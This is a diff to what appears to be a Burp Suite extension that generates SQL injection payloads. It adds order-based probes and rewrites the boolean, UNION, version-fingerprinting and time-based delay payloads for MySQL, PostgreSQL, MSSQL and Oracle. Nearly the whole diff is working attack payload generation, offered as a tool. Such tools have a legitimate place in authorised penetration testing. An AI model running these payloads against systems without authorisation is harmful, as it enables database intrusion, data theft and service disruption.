@@ -16,7 +16,7 @@ try:
 except ImportError:
     print "Failed to load dependencies."
 
-VERSION = "0.37"
+VERSION = "0.38"
 _colorful = True
 
 class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory):
@@ -444,10 +444,9 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._cbDictDepth.setSelectedIndex(5)
         _cbDictDepthPanel = JPanel()
         _cbDictDepthPanel.add(self._cbDictDepth)
-        self._cbGenericSQLi= JCheckBox('Generic SQLi', True)
-        self._cbGenericSQLi.setEnabled(False)
         self._cbTimeBased= JCheckBox('Time-Based Inj', True)
         self._cbUnionBased= JCheckBox('Union-Based Inj', True)
+        self._cbOrderBased= JCheckBox('Order-Based Inj', True)
         self._cbBooleanBased= JCheckBox('Boolean-Based Inj', True)
         self._cbMssqlBased= JCheckBox('Mssql', True)
         self._cbMysqlBased= JCheckBox('Mysql', True)        
@@ -463,13 +462,13 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         _tabDictPanel_1.add(_cbDictDepthPanel, BorderLayout.PAGE_START)
         self._tabDictPanel_SQLi = JPanel(FlowLayout(FlowLayout.LEADING, 10, 10))
         self._tabDictPanel_SQLi.add(self._cbDictEncoding, BorderLayout.PAGE_START)
-        self._tabDictPanel_SQLi.add(self._cbGenericSQLi, BorderLayout.PAGE_START)
         self._tabDictPanel_SQLi.add(self._cbTimeBased, BorderLayout.PAGE_START)
         self._tabDictPanel_SQLi.add(self._cbUnionBased, BorderLayout.PAGE_START)
+        self._tabDictPanel_SQLi.add(self._cbOrderBased, BorderLayout.PAGE_START)
         self._tabDictPanel_SQLi.add(self._cbBooleanBased, BorderLayout.PAGE_START)
-        self._tabDictPanel_SQLi.add(self._cbMssqlBased, BorderLayout.PAGE_START)
         self._tabDictPanel_SQLi.add(self._cbMysqlBased, BorderLayout.PAGE_START)
         self._tabDictPanel_SQLi.add(self._cbPostgreBased, BorderLayout.PAGE_START)
+        self._tabDictPanel_SQLi.add(self._cbMssqlBased, BorderLayout.PAGE_START)
         self._tabDictPanel_SQLi.add(self._cbOracleBased, BorderLayout.PAGE_START)
         self._tabDictPanel_SQLi.setVisible(False)
         _tabDictPanel_1.add(self._tabDictPanel_SQLi, BorderLayout.PAGE_START)        
@@ -679,17 +678,17 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         #prefixes = [""]
 
         delimeterStarts = ["", "'", "\\'", "\\\\'", "\"", "\\\"","\\\\\""]
-        #delimeterStarts = ["", "'"]
+        delimeterStarts = ["'", "\\'", "\\\\'", "\"", "\\\"","\\\\\""]
+        #delimeterStarts = ["'"]
         
         #delimeterBooleans = ["1=1", "1=2", "1<2", "1>2", "true", "false"]
         delimeterBooleans = ["1=1", "1<2", "true"]
         #delimeterBooleans = ["true"]
         
         delimeterEnds = ["", ";", " -- ", "; -- "]
-        #delimeterEnds = ["", "--"]
+        delimeterEnds = ["", "--"]
 
         if self._cbBooleanBased.isSelected():
-            #ok
             for prefix in prefixes:
                 for delimeterStart in delimeterStarts:
                     for delimeterBoolean in delimeterBooleans:
@@ -697,132 +696,132 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                             if prefix[:2].count("\\") == delimeterStart[:2].count("\\") or prefix.find('\\') or delimeterStart.find('\\'): 
                                 listSQLi.append(prefix + delimeterStart + " or " + delimeterBoolean + delimeterEnd + "\n")
             for prefix in prefixes:
-                for delimeterStart in delimeterStarts[1:]:
+                #for delimeterStart in delimeterStarts[1:]:
+                for delimeterStart in delimeterStarts:
                     for delimeterEnd in delimeterEnds[1:]:
                         if prefix[:2].count("\\") == delimeterStart[:2].count("\\") or prefix.find('\\') or delimeterStart.find('\\'): 
                             listSQLi.append(prefix + delimeterStart + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "xyz" + "\n")
                             listSQLi.append(prefix + delimeterStart + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "xyz" + delimeterStart + delimeterEnd + "\n")
                             listSQLi.append(prefix + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "xyz" + delimeterStart + "\n")
                             listSQLi.append(prefix + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "xyz" + delimeterStart + delimeterEnd + "\n")
-                            ##listSQLi.append(prefix + delimeterStart + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "abc" + "\n")
-                            ##listSQLi.append(prefix + delimeterStart + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "abc" + delimeterStart + delimeterEnd + "\n")
-                            ##listSQLi.append(prefix + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "abc" + delimeterStart + "\n")
-                            ##listSQLi.append(prefix + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "abc" + delimeterStart + delimeterEnd + "\n")
 
         if self._cbUnionBased.isSelected():
             for prefix in prefixes:
                 for delimeterStart in delimeterStarts:
                     for delimeterEnd in delimeterEnds:
                         if prefix[:2].count("\\") == delimeterStart[:2].count("\\") or prefix.find('\\') or delimeterStart.find('\\'): 
-                            unionPhrase = " UNION SELECT "
+                            unionPhrase = " union select "
                             for i in range(10):
-                                unionPhrase += "NULL"
-                                listSQLi.append(prefix + delimeterStart + unionPhrase + delimeterEnd + "\n")                    
+                                unionPhrase += "null"
+                                listSQLi.append(prefix + delimeterStart + unionPhrase + delimeterEnd + "\n")
                                 if self._cbMysqlBased.isSelected():
                                     if self._cbTimeBased.isSelected():
-                                        listSQLi.append(prefix + delimeterStart + unionPhrase.replace("SELECT NULL", "SELECT sleep(1000)") + delimeterEnd + "\n")
+                                        listSQLi.append(prefix + delimeterStart + unionPhrase.replace("select null", "select sleep(1000)") + delimeterEnd + "\n")
                                 if self._cbPostgreBased.isSelected():
                                     if self._cbTimeBased.isSelected():
-                                        listSQLi.append(prefix + delimeterStart + unionPhrase.replace("SELECT NULL", "SELECT (SELECT 1337 FROM PG_SLEEP(1000))") + delimeterEnd + "\n")
-                                #if self._cbMssqlBased.isSelected(): it seems mysql is not vulnerable with WAITFOR DELAY
+                                        listSQLi.append(prefix + delimeterStart + unionPhrase.replace("select null", "select (select 1337 from pg_sleep(1000))") + delimeterEnd + "\n")
+                                #if self._cbMssqlBased.isSelected(): it seems mysql is not vulnerable with waitfor delay
                                 #    if self._cbTimeBased.isSelected():
-                                #        listSQLi.append(prefix + delimeterStart + unionPhrase.replace("SELECT NULL", "SELECT WAITFOR DELAY "+ delimeterStart + "00:15" + delimeterStart) + delimeterEnd + "\n")
+                                #        listSQLi.append(prefix + delimeterStart + unionPhrase.replace("select null", "select waitfor delay "+ delimeterStart + "00:20" + delimeterStart) + delimeterEnd + "\n")
                                 unionPhrase += ","
+        
+        if self._cbOrderBased.isSelected():
+            for prefix in prefixes:
+                for delimeterStart in delimeterStarts:
+                    for delimeterEnd in delimeterEnds:
+                        if prefix[:2].count("\\") == delimeterStart[:2].count("\\") or prefix.find('\\') or delimeterStart.find('\\'): 
+                            for i in range(10):
+                                listSQLi.append(prefix + delimeterStart + " order by " + str(i+1) + delimeterEnd + "\n")
+                                listSQLi.append(prefix + delimeterStart + " order by " + str(i+1) + delimeterStart + "\n")
+                                listSQLi.append(prefix + " order by " + str(i+1) + delimeterEnd + "\n")
+                                listSQLi.append(prefix + " order by " + str(i+1) + "\n")
 
         for prefix in prefixes:
             for delimeterStart in delimeterStarts:
                 for delimeterEnd in delimeterEnds:
                     if prefix[:2].count("\\") == delimeterStart[:2].count("\\") or prefix.find('\\') or delimeterStart.find('\\'): 
-                        listSQLi.append(prefix + delimeterStart + ";SELECT 1337" + delimeterEnd + "\n")
-                        listSQLi.append(prefix + delimeterStart + "SELECT 1337" + delimeterEnd + "\n")
                         if self._cbOracleBased.isSelected():
-                            listSQLi.append(prefix + delimeterStart + ";SELECT banner FROM v$version" + delimeterEnd + "\n")
-                            listSQLi.append(prefix + delimeterStart + ";SELECT version FROM v$instance" + delimeterEnd + "\n")
-                            listSQLi.append(prefix + delimeterStart + ";SELECT banner FROM v$version" + delimeterStart + "\n")
-                            listSQLi.append(prefix + delimeterStart + ";SELECT version FROM v$instance" + delimeterStart + "\n")
-                            if not delimeterStart:
-                                listSQLi.append(prefix + delimeterStart + "SELECT banner FROM v$version" + delimeterEnd + "\n")
-                                listSQLi.append(prefix + delimeterStart + "SELECT version FROM v$instance" + delimeterEnd + "\n")
+                            listSQLi.append(prefix + delimeterStart + ";select banner from v$version" + delimeterEnd + "\n")
+                            listSQLi.append(prefix + delimeterStart + ";select version from v$instance" + delimeterEnd + "\n")
+                            #if not delimeterStart:
+                            #    listSQLi.append(prefix + delimeterStart + "select banner from v$version" + delimeterEnd + "\n")
+                            #    listSQLi.append(prefix + delimeterStart + "select version from v$instance" + delimeterEnd + "\n")
                             if self._cbTimeBased.isSelected():
                                 if delimeterStart:
-                                    listSQLi.append(prefix + delimeterStart + " or 1337=dbms_pipe.receive_message((" + delimeterStart + "a" + delimeterStart + "),100)" + delimeterEnd + "\n")
-                                    listSQLi.append(prefix + delimeterStart + " or 1337=dbms_pipe.receive_message((" + delimeterStart + "a" + delimeterStart + "),100)" + delimeterEnd + "\n")
-                                    listSQLi.append(prefix + delimeterStart + " or 1337=dbms_pipe.receive_message((" + delimeterStart + "a" + delimeterStart + "),100)" + delimeterStart + "\n")
-                                    listSQLi.append(prefix + delimeterStart + " or 1337=dbms_pipe.receive_message((" + delimeterStart + "a" + delimeterStart + "),100) or " + delimeterStart + "\n")                                    
-                                    listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message((" + delimeterStart + "a" + delimeterStart + "),100)" + delimeterEnd + "\n")
-                                    listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message((" + delimeterStart + "a" + delimeterStart + "),100) or " + "\n")
-                                    ##listSQLi.append(prefix + delimeterStart + " and 1337=dbms_pipe.receive_message((" + delimeterStart + "a" + delimeterStart + "),100)" + delimeterEnd + "\n")
-                                    ##listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message((" + delimeterStart + "a" + delimeterStart + "),100)" + delimeterEnd + "\n")
+                                    listSQLi.append(prefix + delimeterStart + " and 1337=dbms_pipe.receive_message((" + delimeterStart + "a" + delimeterStart + "),1000)" + delimeterEnd + "\n")
+                                    listSQLi.append(prefix + delimeterStart + " and 1337=dbms_pipe.receive_message((" + delimeterStart + "a" + delimeterStart + "),1000)" + delimeterEnd + "\n")
+                                    listSQLi.append(prefix + delimeterStart + " and 1337=dbms_pipe.receive_message((" + delimeterStart + "a" + delimeterStart + "),1000)" + delimeterStart + "\n")
+                                    listSQLi.append(prefix + delimeterStart + " and 1337=dbms_pipe.receive_message((" + delimeterStart + "a" + delimeterStart + "),1000) and " + delimeterStart + "\n")                                    
+                                    #listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message((" + delimeterStart + "a" + delimeterStart + "),1000)" + delimeterEnd + "\n")
+                                    #listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message((" + delimeterStart + "a" + delimeterStart + "),1000) and " + "\n")
+                                    listSQLi.append(prefix + delimeterStart + " or 1337=dbms_pipe.receive_message((" + delimeterStart + "a" + delimeterStart + "),1000)" + delimeterEnd + "\n")
+                                    listSQLi.append(prefix + delimeterStart + " or 1337=dbms_pipe.receive_message((" + delimeterStart + "a" + delimeterStart + "),1000)" + delimeterEnd + "\n")
+                                    listSQLi.append(prefix + delimeterStart + " or 1337=dbms_pipe.receive_message((" + delimeterStart + "a" + delimeterStart + "),1000)" + delimeterStart + "\n")
+                                    listSQLi.append(prefix + delimeterStart + " or 1337=dbms_pipe.receive_message((" + delimeterStart + "a" + delimeterStart + "),1000) or " + delimeterStart + "\n")                                    
+                                    #listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message((" + delimeterStart + "a" + delimeterStart + "),1000)" + delimeterEnd + "\n")
+                                    #listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message((" + delimeterStart + "a" + delimeterStart + "),1000) or " + "\n")
                         
                         if self._cbMysqlBased.isSelected():
-                            listSQLi.append(prefix + delimeterStart + ";SELECT @@version" + delimeterEnd + "\n")
-                            listSQLi.append(prefix + delimeterStart + ";SELECT @@version" + delimeterStart + "\n")
-                            if not delimeterStart:
-                                listSQLi.append(prefix + delimeterStart + "SELECT @@version" + delimeterEnd + "\n")
+                            listSQLi.append(prefix + delimeterStart + ";select @@version" + delimeterEnd + "\n")
+                            #if not delimeterStart:
+                            #    listSQLi.append(prefix + delimeterStart + "select @@version" + delimeterEnd + "\n")
                             if self._cbTimeBased.isSelected():
-                                listSQLi.append(prefix + delimeterStart + ";SELECT sleep(1000)" + delimeterEnd + "\n")
-                                listSQLi.append(prefix + delimeterStart + " | sleep(1000)" + delimeterEnd + "\n")
-                                listSQLi.append(prefix + delimeterStart + " | sleep(1000) | " + delimeterStart + "\n")
-                                listSQLi.append(prefix + delimeterStart + " | sleep(1000) " + delimeterStart + "\n")                                
-                                listSQLi.append(prefix + delimeterStart + " || sleep(1000)" + delimeterEnd + "\n")
-                                listSQLi.append(prefix + delimeterStart + " || sleep(1000) || " + delimeterStart + "\n")
-                                listSQLi.append(prefix + delimeterStart + " || sleep(1000) " + delimeterStart + "\n")                                
-                                #listSQLi.append(prefix + delimeterStart + " && sleep(1000)" + delimeterEnd + "\n")
-                                #listSQLi.append(prefix + delimeterStart + " && sleep(1000) && " + delimeterStart + "\n")
-                                #listSQLi.append(prefix + delimeterStart + " && sleep(1000) " + delimeterStart + "\n")
-                                #listSQLi.append(prefix + delimeterStart + " and sleep(1000)" + delimeterEnd + "\n")
-                                #listSQLi.append(prefix + delimeterStart + " and sleep(1000) and " + delimeterStart + "\n")
-                                #listSQLi.append(prefix + delimeterStart + " and sleep(1000) " + delimeterStart + "\n")                            
-                                listSQLi.append(prefix + delimeterStart + " or 1337=(SELECT 1337 FROM (SELECT SLEEP(1000))A)" + delimeterEnd + "\n")
-                                listSQLi.append(prefix + delimeterStart + " or 1337=(SELECT 1337 FROM (SELECT SLEEP(1000))A)" + delimeterStart + "\n")
-                                listSQLi.append(prefix + delimeterStart + " or 1337=(SELECT 1337 FROM (SELECT SLEEP(1000))A) or " + delimeterStart + "\n")
-                                ##listSQLi.append(prefix + delimeterStart + " and 1337=(SELECT 1337 FROM (SELECT SLEEP(1000))A)" + delimeterEnd + "\n")                                
-                                if not delimeterStart:
-                                    listSQLi.append(prefix + delimeterStart + "SELECT sleep(1000)" + delimeterEnd + "\n")
-                                if delimeterStart:
-                                    listSQLi.append(prefix + delimeterStart + " or 1337=(SELECT 1337 FROM (SELECT SLEEP(1000))A)" + delimeterStart + "\n")
-                                    listSQLi.append(prefix + delimeterStart + " or 1337=(SELECT 1337 FROM (SELECT SLEEP(1000))A)" + delimeterEnd + "\n")
-                                    listSQLi.append(prefix + delimeterStart + " or 1337=(SELECT 1337 FROM (SELECT SLEEP(1000))A) or " + delimeterStart + "\n")
+                                listSQLi.append(prefix + delimeterStart + ";select sleep(1000)" + delimeterEnd + "\n")
+                                listSQLi.append(prefix + delimeterStart + " and sleep(1000)" + delimeterEnd + "\n")
+                                listSQLi.append(prefix + delimeterStart + " and sleep(1000) and " + delimeterStart + "\n")
+                                listSQLi.append(prefix + delimeterStart + " and sleep(1000) " + delimeterStart + "\n")
+                                listSQLi.append(prefix + delimeterStart + " or sleep(1000)" + delimeterEnd + "\n")
+                                listSQLi.append(prefix + delimeterStart + " or sleep(1000) or " + delimeterStart + "\n")
+                                listSQLi.append(prefix + delimeterStart + " or sleep(1000) " + delimeterStart + "\n")
+                                listSQLi.append(prefix + delimeterStart + " and 1337=(select 1337 from (select sleep(1000))A)" + delimeterStart + "\n")
+                                listSQLi.append(prefix + delimeterStart + " and 1337=(select 1337 from (select sleep(1000))A)" + delimeterEnd + "\n")                                
+                                listSQLi.append(prefix + delimeterStart + " and 1337=(select 1337 from (select sleep(1000))A) and " + delimeterStart + "\n")
+                                listSQLi.append(prefix + delimeterStart + " or 1337=(select 1337 from (select sleep(1000))A)" + delimeterStart + "\n")
+                                listSQLi.append(prefix + delimeterStart + " or 1337=(select 1337 from (select sleep(1000))A)" + delimeterEnd + "\n")                                
+                                listSQLi.append(prefix + delimeterStart + " or 1337=(select 1337 from (select sleep(1000))A) or " + delimeterStart + "\n")
+                                #if not delimeterStart:
+                                #    listSQLi.append(prefix + delimeterStart + "select sleep(1000)" + delimeterEnd + "\n")
+                                #    listSQLi.append(prefix + delimeterStart + "sleep(1000)" + delimeterEnd + "\n")
                         
                         if self._cbPostgreBased.isSelected():
-                            listSQLi.append(prefix + delimeterStart + ";SELECT version()" + delimeterEnd + "\n")
-                            listSQLi.append(prefix + delimeterStart + ";SELECT version()" + delimeterStart + "\n")
-                            if not delimeterStart:
-                                listSQLi.append(prefix + delimeterStart + "SELECT version()" + delimeterEnd + "\n")
+                            listSQLi.append(prefix + delimeterStart + ";select version()" + delimeterEnd + "\n")
+                            #if not delimeterStart:
+                            #    listSQLi.append(prefix + delimeterStart + "select version()" + delimeterEnd + "\n")
                             if self._cbTimeBased.isSelected():
-                                listSQLi.append(prefix + delimeterStart + ";SELECT pg_sleep(1000)" + delimeterEnd + "\n")
-                                listSQLi.append(prefix + delimeterStart + " || pg_sleep(1000)" + delimeterEnd + "\n")
-                                listSQLi.append(prefix + delimeterStart + " || pg_sleep(1000) || " + delimeterStart + "\n")
-                                listSQLi.append(prefix + delimeterStart + " || pg_sleep(1000)" + delimeterStart + "\n")
-                                listSQLi.append(prefix + delimeterStart + " or 1337=(SELECT 1337 FROM PG_SLEEP(1000))" + delimeterEnd + "\n")
-                                listSQLi.append(prefix + delimeterStart + " or 1337=(SELECT 1337 FROM PG_SLEEP(1000))" + delimeterStart + "\n")
-                                listSQLi.append(prefix + delimeterStart + " or 1337=(SELECT 1337 FROM PG_SLEEP(1000)) or " + delimeterStart + "\n")
-                                ##listSQLi.append(prefix + delimeterStart + " and 1337=(SELECT 1337 FROM PG_SLEEP(1000))" + delimeterEnd + "\n")
-                                if not delimeterStart:
-                                    listSQLi.append(prefix + delimeterStart + "SELECT pg_sleep(1000)" + delimeterEnd + "\n")
-                                    #supheliyim
-                                    listSQLi.append(prefix + delimeterStart + " pg_sleep(1000)" + delimeterEnd + "\n")
-                                if delimeterStart:
-                                    listSQLi.append(prefix + delimeterStart + " or 1337=(SELECT 1337 FROM PG_SLEEP(1000))" + delimeterStart + "\n")
-                                    listSQLi.append(prefix + delimeterStart + " or 1337=(SELECT 1337 FROM PG_SLEEP(1000))" + delimeterEnd + "\n")
-                                    listSQLi.append(prefix + delimeterStart + " or 1337=(SELECT 1337 FROM PG_SLEEP(1000)) or " + delimeterStart + "\n")
+                                listSQLi.append(prefix + delimeterStart + ";select pg_sleep(1000)" + delimeterEnd + "\n")
+                                listSQLi.append(prefix + delimeterStart + " and pg_sleep(1000)" + delimeterEnd + "\n")
+                                listSQLi.append(prefix + delimeterStart + " and pg_sleep(1000) and " + delimeterStart + "\n")
+                                listSQLi.append(prefix + delimeterStart + " and pg_sleep(1000)" + delimeterStart + "\n")
+                                listSQLi.append(prefix + delimeterStart + " or pg_sleep(1000)" + delimeterEnd + "\n")
+                                listSQLi.append(prefix + delimeterStart + " or pg_sleep(1000) or " + delimeterStart + "\n")
+                                listSQLi.append(prefix + delimeterStart + " or pg_sleep(1000)" + delimeterStart + "\n")
+                                listSQLi.append(prefix + delimeterStart + " and 1337=(select 1337 from pg_sleep(1000))" + delimeterStart + "\n")
+                                listSQLi.append(prefix + delimeterStart + " and 1337=(select 1337 from pg_sleep(1000))" + delimeterEnd + "\n")                                
+                                listSQLi.append(prefix + delimeterStart + " and 1337=(select 1337 from pg_sleep(1000)) and " + delimeterStart + "\n")
+                                listSQLi.append(prefix + delimeterStart + " or 1337=(select 1337 from pg_sleep(1000))" + delimeterStart + "\n")
+                                listSQLi.append(prefix + delimeterStart + " or 1337=(select 1337 from pg_sleep(1000))" + delimeterEnd + "\n")                                
+                                listSQLi.append(prefix + delimeterStart + " or 1337=(select 1337 from pg_sleep(1000)) or " + delimeterStart + "\n")
+                                #if not delimeterStart:
+                                #    listSQLi.append(prefix + delimeterStart + "select pg_sleep(1000)" + delimeterEnd + "\n")                                    
+                                #    listSQLi.append(prefix + delimeterStart + " pg_sleep(1000)" + delimeterEnd + "\n")
                         
                         if self._cbMssqlBased.isSelected():
-                            listSQLi.append(prefix + delimeterStart + ";SELECT @@version" + delimeterEnd + "\n")
-                            listSQLi.append(prefix + delimeterStart + ";SELECT @@version" + delimeterStart +"\n")
-                            if not delimeterStart:
-                                listSQLi.append(prefix + delimeterStart + "SELECT @@version" + delimeterEnd + "\n")
+                            listSQLi.append(prefix + delimeterStart + ";select @@version" + delimeterEnd + "\n")
+                            #if not delimeterStart:
+                            #    listSQLi.append(prefix + delimeterStart + "select @@version" + delimeterEnd + "\n")
                             if self._cbTimeBased.isSelected():
                                 if delimeterStart:
-                                    listSQLi.append(prefix + delimeterStart + " or WAITFOR DELAY " + delimeterStart + "00:15" + delimeterStart + delimeterEnd + "\n")
-                                    listSQLi.append(prefix + delimeterStart + " or WAITFOR DELAY " + delimeterStart + "00:15" + delimeterStart + " or " + delimeterStart + "\n")
-                                    listSQLi.append(prefix + " or WAITFOR DELAY " + delimeterStart + "00:15" + delimeterStart + delimeterEnd + "\n")
-                                    ##listSQLi.append(prefix + delimeterStart + " and WAITFOR DELAY " + delimeterStart + "00:15" + delimeterStart + delimeterEnd + "\n")
-                                    listSQLi.append(prefix + delimeterStart + ";WAITFOR DELAY " + delimeterStart + "00:15" + delimeterStart + delimeterEnd + "\n")
-                                    listSQLi.append(prefix + ";WAITFOR DELAY " + delimeterStart + "00:15" + delimeterStart + delimeterEnd + "\n")                                    
-                                    listSQLi.append(prefix + "WAITFOR DELAY " + delimeterStart + "00:15" + delimeterStart + delimeterEnd + "\n")
-                                    listSQLi.append(prefix + delimeterStart + " WAITFOR DELAY " + delimeterStart + "00:15" + delimeterStart + delimeterEnd + "\n")
-                                    listSQLi.append(prefix + delimeterStart + " WAITFOR DELAY " + delimeterStart + "00:15" + delimeterStart + " " + delimeterStart + "\n")
+                                    listSQLi.append(prefix + delimeterStart + " and waitfor delay " + delimeterStart + "00:20" + delimeterStart + delimeterEnd + "\n")
+                                    listSQLi.append(prefix + delimeterStart + " and waitfor delay " + delimeterStart + "00:20" + delimeterStart + " and " + delimeterStart + "\n")
+                                    #listSQLi.append(prefix + " and waitfor delay " + delimeterStart + "00:20" + delimeterStart + delimeterEnd + "\n")
+                                    listSQLi.append(prefix + delimeterStart + " or waitfor delay " + delimeterStart + "00:20" + delimeterStart + delimeterEnd + "\n")
+                                    listSQLi.append(prefix + delimeterStart + " or waitfor delay " + delimeterStart + "00:20" + delimeterStart + " or " + delimeterStart + "\n")
+                                    #listSQLi.append(prefix + " or waitfor delay " + delimeterStart + "00:20" + delimeterStart + delimeterEnd + "\n")
+                                    listSQLi.append(prefix + delimeterStart + ";waitfor delay " + delimeterStart + "00:20" + delimeterStart + delimeterEnd + "\n")
+                                    #listSQLi.append(prefix + ";waitfor delay " + delimeterStart + "00:20" + delimeterStart + delimeterEnd + "\n")                                    
+                                    #listSQLi.append(prefix + "waitfor delay " + delimeterStart + "00:20" + delimeterStart + delimeterEnd + "\n")
+                                    listSQLi.append(prefix + delimeterStart + " waitfor delay " + delimeterStart + "00:20" + delimeterStart + delimeterEnd + "\n")
+                                    listSQLi.append(prefix + delimeterStart + " waitfor delay " + delimeterStart + "00:20" + delimeterStart + " " + delimeterStart + "\n")
 
         listSQLi = list(set(listSQLi))
         listSQLi.sort(reverse=True)
